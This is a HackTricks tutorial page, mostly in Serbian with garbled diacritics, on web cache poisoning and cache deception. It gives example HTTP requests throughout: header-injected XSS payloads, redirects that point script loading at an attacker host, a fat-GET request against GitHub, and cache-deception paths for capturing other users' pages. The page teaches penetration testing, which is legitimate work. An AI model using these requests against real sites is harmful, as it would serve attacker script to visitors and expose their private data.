# Cache Poisoning and Cache Deception

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=cache-deception) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=cache-deception" %}

## The difference

> **Koja je razlika izme캠u web cache poisoning i web cache deception?**
>
> * U **web cache poisoning**, napada캜 uzrokuje da aplikacija sa캜uva neki zlonamerni sadr쬬j u ke코u, a ovaj sadr쬬j se servira iz ke코a drugim korisnicima aplikacije.
> * U **web cache deception**, napada캜 uzrokuje da aplikacija sa캜uva neki osetljiv sadr쬬j koji pripada drugom korisniku u ke코u, a napada캜 zatim preuzima ovaj sadr쬬j iz ke코a.

## Cache Poisoning

Cache poisoning je usmeren na manipulaciju ke코om na strani klijenta kako bi se primorali klijenti da u캜itavaju resurse koji su neo캜ekivani, delimi캜ni ili pod kontrolom napada캜a. Stepen uticaja zavisi od popularnosti pogo캠ene stranice, jer se kontaminirani odgovor servira isklju캜ivo korisnicima koji pose캖uju stranicu tokom perioda kontaminacije ke코a.

Izvr코enje napada cache poisoning uklju캜uje nekoliko koraka:

1. **Identifikacija neklju캜enih ulaza**: Ovo su parametri koji, iako nisu potrebni da bi zahtev bio ke코iran, mogu promeniti odgovor koji server vra캖a. Identifikacija ovih ulaza je klju캜na jer se mogu iskoristiti za manipulaciju ke코om.
2. **Eksploatacija neklju캜enih ulaza**: Nakon identifikacije neklju캜enih ulaza, slede캖i korak uklju캜uje pronala쬰nje na캜ina kako da se zloupotrebe ovi parametri kako bi se izmenio odgovor servera na na캜in koji koristi napada캜u.
3. **Osiguranje da je kontaminirani odgovor ke코iran**: Poslednji korak je osigurati da je manipulisan odgovor sa캜uvan u ke코u. Na ovaj na캜in, svaki korisnik koji pristupa pogo캠enoj stranici dok je ke코 kontaminiran 캖e primiti kontaminirani odgovor.

### Discovery: Check HTTP headers

Obi캜no, kada je odgovor **sa캜uvan u ke코u**, bi캖e **zaglavlje koje to ozna캜ava**, mo쬰te proveriti koja zaglavlja treba da obratite pa쬹ju u ovom postu: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Discovery: Caching error codes

Ako mislite da se odgovor 캜uva u ke코u, mogli biste poku코ati da **po코aljete zahteve sa lo코im zaglavljem**, na koje bi trebalo da se odgovori sa **status kodom 400**. Zatim poku코ajte da pristupite zahtevu normalno i ako je **odgovor status kod 400**, znate da je ranjiv (i mogli biste 캜ak izvr코iti DoS).

Mo쬰te prona캖i vi코e opcija u:

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

Me캠utim, imajte na umu da **ponekad ovi tipovi status kodova nisu ke코irani**, tako da ovaj test mo쬯a ne캖e biti pouzdan.

### Discovery: Identify and evaluate unkeyed inputs

Mo쬰te koristiti [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) da **brute-force parametre i zaglavlja** koja mogu **menjati odgovor stranice**. Na primer, stranica mo쬰 koristiti zaglavlje `X-Forwarded-For` da ozna캜i klijentu da u캜ita skriptu odatle:
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Izazivanje 코tetnog odgovora sa back-end servera

Sa identifikovanim parametrom/hedderom proverite kako se **sanitizuje** i **gde** se **odra쬬va** ili uti캜e na odgovor iz hedera. Mo쬰te li to zloupotrebiti na neki na캜in (izvr코iti XSS ili u캜itati JS kod koji kontroli코ete? izvr코iti DoS?...)

### Dobijanje ke코iranog odgovora

Kada ste **identifikovali** **stranicu** koja se mo쬰 zloupotrebiti, koji **parametar**/**heder** koristiti i **kako** ga **zloupotrebiti**, potrebno je da dobijete stranicu ke코iranu. U zavisnosti od resursa koji poku코avate da dobijete u ke코u, ovo mo쬰 potrajati, mo쬯a 캖ete morati da poku코avate nekoliko sekundi.

Heder **`X-Cache`** u odgovoru mo쬰 biti veoma koristan jer mo쬰 imati vrednost **`miss`** kada zahtev nije ke코iran i vrednost **`hit`** kada je ke코iran.\
Heder **`Cache-Control`** je tako캠e zanimljiv da se zna da li se resurs ke코ira i kada 캖e slede캖i put biti ke코iran: `Cache-Control: public, max-age=1800`

Jo코 jedan zanimljiv heder je **`Vary`**. Ovaj heder se 캜esto koristi da **nazna캜i dodatne hedere** koji se tretiraju kao **deo ke코 klju캜a** 캜ak i ako su obi캜no neklu캜ni. Stoga, ako korisnik zna `User-Agent` rtve koju cilja, mo쬰 otrovati ke코 za korisnike koji koriste taj specifi캜ni `User-Agent`.

Jo코 jedan heder povezan sa ke코om je **`Age`**. Defini코e vreme u sekundama koliko je objekat bio u proxy ke코u.

Kada ke코irate zahtev, budite **oprezni sa hederima koje koristite** jer neki od njih mogu biti **nepredvi캠eno kori코캖eni** kao **klju캜ni** i **rtva 캖e morati da koristi taj isti heder**. Uvek **testirajte** Cache Poisoning sa **razli캜itim pretra쬴va캜ima** da proverite da li funkcioni코e.

## Primeri eksploatacije

### Najlak코i primer

Heder poput `X-Forwarded-For` se odra쬬va u odgovoru bez sanitizacije.\
Mo쬰te poslati osnovni XSS payload i otrovati ke코 tako da svako ko pristupi stranici bude XSS-ovan:
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Napomena da 캖e ovo otrovati zahtev za `/en?region=uk`, a ne za `/en`_

### Trovanje ke코a za DoS

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

### Kori코캖enje trovanja web ke코a za iskori코캖avanje ranjivosti u rukovanju kola캜i캖ima

Kola캜i캖i se tako캠e mogu odraziti na odgovor stranice. Ako mo쬰te da to iskoristite da izazovete XSS, na primer, mogli biste da iskoristite XSS u nekoliko klijenata koji u캜itavaju zlonamerni odgovor iz ke코a.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Napomena da ako je ranjavi kola캜i캖 veoma kori코캖en od strane korisnika, redovni zahtevi 캖e 캜istiti ke코.

### Generisanje razlika sa delimiterima, normalizacijom i ta캜kama <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Proverite:

{% content-ref url="cache-poisoning-via-url-discrepancies.md" %}
[cache-poisoning-via-url-discrepancies.md](cache-poisoning-via-url-discrepancies.md)
{% endcontent-ref %}

### Trovanje ke코a sa prolazom kroz putanju za kra캠u API klju캜a <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Ovaj izve코taj obja코njava**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) kako je bilo mogu캖e ukrasti OpenAI API klju캜 sa URL-om poput `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` jer 캖e sve 코to odgovara `/share/*` biti ke코irano bez Cloudflare normalizacije URL-a, 코to je ura캠eno kada je zahtev stigao do web servera.

Ovo je tako캠e bolje obja코njeno u:

{% content-ref url="cache-poisoning-via-url-discrepancies.md" %}
[cache-poisoning-via-url-discrepancies.md](cache-poisoning-via-url-discrepancies.md)
{% endcontent-ref %}

### Kori코캖enje vi코e zaglavlja za eksploataciju ranjivosti trovanja web ke코a <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Ponekad 캖e vam biti potrebno da **iskoristite nekoliko neklju캜enih ulaza** kako biste mogli da zloupotrebite ke코. Na primer, mo쬰te prona캖i **Open redirect** ako postavite `X-Forwarded-Host` na domen koji kontroli코ete i `X-Forwarded-Scheme` na `http`. **Ako** **server** **prosledi** sve **HTTP** zahteve **na HTTPS** i koristi zaglavlje `X-Forwarded-Scheme` kao naziv domena za preusmeravanje. Mo쬰te kontrolisati gde je stranica usmerena preusmeravanjem.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Iskori코캖avanje sa ograni캜enim `Vary` zaglavljem

Ako ste otkrili da se **`X-Host`** zaglavlje koristi kao **ime domena za u캜itavanje JS resursa** ali **`Vary`** zaglavlje u odgovoru ukazuje na **`User-Agent`**. Tada treba da prona캠ete na캜in da exfiltrirate User-Agent rtve i otrovate ke코 koriste캖i taj korisni캜ki agent:
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Po코aljite GET zahtev sa zahtevom u URL-u i u telu. Ako web server koristi onaj iz tela, ali server za ke코iranje ke코ira onaj iz URL-a, svako ko pristupi tom URL-u zapravo 캖e koristiti parametar iz tela. Kao ranjivost koju je prona코ao James Kettle na Github vebsajtu:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
There it a portswigger lab about this: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

Na primer, mogu캖e je odvojiti **parametre** na ruby serverima koriste캖i karakter **`;`** umesto **`&`**. Ovo se mo쬰 koristiti za stavljanje vrednosti neklju캜enih parametara unutar klju캜nih i njihovo zloupotrebljavanje.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

Saznajte ovde kako da izvr코ite [Cache Poisoning napade zloupotrebom HTTP Request Smuggling](../http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Automated testing for Web Cache Poisoning

[Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) mo쬰 se koristiti za automatsko testiranje web cache poisoning-a. Podr쬬va mnoge razli캜ite tehnike i veoma je prilagodljiv.

Primer kori코캖enja: `wcvs -u example.com`

## Vulnerable Examples

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS je prosledio fragment unutar URL-a bez uklanjanja i generisao klju캜 ke코a koriste캖i samo host, putanju i upit (ignori코u캖i fragment). Tako je zahtev `/#/../?r=javascript:alert(1)` poslat backend-u kao `/#/../?r=javascript:alert(1)` i klju캜 ke코a nije imao payload unutar njega, samo host, putanju i upit.

### GitHub CP-DoS

Slanje lo코e vrednosti u headeru content-type izazvalo je 405 ke코irani odgovor. Klju캜 ke코a je sadr쬬o kola캜i캖, tako da je bilo mogu캖e napasti samo neautorizovane korisnike.

### GitLab + GCP CP-DoS

GitLab koristi GCP kante za skladi코tenje stati캜kog sadr쬬ja. **GCP Kante** podr쬬vaju **header `x-http-method-override`**. Tako je bilo mogu캖e poslati header `x-http-method-override: HEAD` i otrovati ke코 da vrati prazan odgovor. Tako캠e je mogla podr쬬ti metodu `PURGE`.

### Rack Middleware (Ruby on Rails)

U Ruby on Rails aplikacijama, Rack middleware se 캜esto koristi. Svrha Rack koda je da uzme vrednost **`x-forwarded-scheme`** headera i postavi je kao shemu zahteva. Kada se po코alje header `x-forwarded-scheme: http`, dolazi do 301 preusmeravanja na istu lokaciju, 코to mo쬰 izazvati Denial of Service (DoS) za taj resurs. Pored toga, aplikacija mo쬰 prepoznati `X-forwarded-host` header i preusmeriti korisnike na odre캠eni host. Ovo pona코anje mo쬰 dovesti do u캜itavanja JavaScript datoteka sa servera napada캜a, 코to predstavlja sigurnosni rizik.

### 403 and Storage Buckets

Cloudflare je ranije ke코irao 403 odgovore. Poku코aj pristupa S3 ili Azure Storage Blobs sa pogre코nim Authorization headerima rezultirao bi 403 odgovorom koji je ke코iran. Iako je Cloudflare prestao da ke코ira 403 odgovore, ovo pona코anje mo쬰 i dalje biti prisutno u drugim proxy servisima.

### Injecting Keyed Parameters

Ke코evi 캜esto uklju캜uju specifi캜ne GET parametre u klju캜 ke코a. Na primer, Fastly-ov Varnish je ke코irao `size` parametar u zahtevima. Me캠utim, ako je URL-enkodirana verzija parametra (npr. `siz%65`) tako캠e poslata sa pogre코nom vredno코캖u, klju캜 ke코a bi bio konstruisan koriste캖i ispravni `size` parametar. Ipak, backend bi obradio vrednost u URL-enkodiranom parametru. URL-enkodiranje drugog `size` parametra dovelo je do njegovog izostavljanja od strane ke코a, ali do njegove upotrebe od strane backend-a. Dodeljivanje vrednosti 0 ovom parametru rezultiralo je ke코iranim 400 Bad Request gre코kom.

### User Agent Rules

Neki programeri blokiraju zahteve sa user-agentima koji se poklapaju sa onima visoko prometnih alata kao 코to su FFUF ili Nuclei kako bi upravljali optere캖enjem servera. Ironi캜no, ovaj pristup mo쬰 uvesti ranjivosti kao 코to su ke코iranje i DoS.

### Illegal Header Fields

[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) defini코e prihvatljive karaktere u nazivima headera. Headeri koji sadr쬰 karaktere van specificiranog **tchar** opsega bi idealno trebali izazvati 400 Bad Request odgovor. U praksi, serveri ne po코tuju uvek ovaj standard. Zna캜ajan primer je Akamai, koji prosle캠uje header-e sa neva쬰캖im karakterima i ke코ira svaku 400 gre코ku, sve dok `cache-control` header nije prisutan. Identifikovan je iskoristiv obrazac gde slanje headera sa nelegalnim karakterom, kao 코to je `\`, rezultira ke코iranom 400 Bad Request gre코kom.

### Finding new headers

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

Cilj Cache Deception-a je da natera klijente **da u캜itaju resurse koji 캖e biti sa캜uvani u ke코u sa njihovim osetljivim informacijama**.

Prvo, imajte na umu da su **ekstenzije** kao 코to su `.css`, `.js`, `.png` itd. obi캜no **konfigurisane** da budu **sa캜uvane** u **ke코u.** Stoga, ako pristupite `www.example.com/profile.php/nonexistent.js`, ke코 캖e verovatno sa캜uvati odgovor jer vidi `.js` **ekstenziju**. Ali, ako se **aplikacija** **replay-uje** sa **osetljivim** korisni캜kim sadr쬬jem sa캜uvanim u _www.example.com/profile.php_, mo쬰te **ukrasti** te sadr쬬je od drugih korisnika.

Druge stvari za testiranje:

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _Koristite manje poznate ekstenzije kao 코to su_ `.avif`

Jo코 jedan vrlo jasan primer mo쬰 se na캖i u ovom izve코taju: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
U primeru se obja코njava da ako u캜itate nepostoje캖u stranicu kao 코to je _http://www.example.com/home.php/non-existent.css_, sadr쬬j _http://www.example.com/home.php_ (**sa osetljivim informacijama korisnika**) 캖e biti vra캖en i ke코 server 캖e sa캜uvati rezultat.\
Zatim, **napada캜** mo쬰 pristupiti _http://www.example.com/home.php/non-existent.css_ u svom pretra쬴va캜u i posmatrati **povjerljive informacije** korisnika koji su prethodno pristupili.

Imajte na umu da bi **ke코 proxy** trebao biti **konfiguran** da **ke코ira** datoteke **na osnovu** **ekstenzije** datoteke (_.css_) a ne na osnovu content-type. U primeru _http://www.example.com/home.php/non-existent.css_ 캖e imati `text/html` content-type umesto `text/css` mime tipa (코to je o캜ekivano za _.css_ datoteku).

Saznajte ovde kako da izvr코ite [Cache Deceptions napade zloupotrebom HTTP Request Smuggling](../http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-deception).

## Automatic Tools

* [**toxicache**](https://github.com/xhzeem/toxicache): Golang skener za pronala쬰nje ranjivosti web cache poisoning u listi URL-ova i testiranje vi코e tehnika injekcije.

## References

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
* [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
* [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
* [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=cache-deception) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=cache-deception" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
